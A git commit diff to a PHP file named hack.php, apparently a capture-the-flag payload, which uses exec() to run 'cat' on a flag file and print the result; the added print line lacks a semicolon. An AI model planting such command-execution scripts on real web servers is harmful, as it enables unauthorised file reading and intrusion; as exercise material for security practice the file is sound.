2a01b4a20bb242302acfc72d194882990ecc359c
yeungsinchun <98640709+yeungsinchun@users.noreply.github.com>
2023-09-03 01:13:02 +0800

    Update hack.php

--- hack.php
+++ hack.php
@@ -2,8 +2,9 @@
 // outputs the username that owns the running php/httpd process
 // (on a system with the "whoami" executable in the path)
 $output=null;
-$retval=null;\
+$retval=null;
 exec('cat flag-e3deebb27b56053dd7041cf93d1499f4', $output, $retval);
+print($output)
 print_r($output);
 print($retval);
 ?>
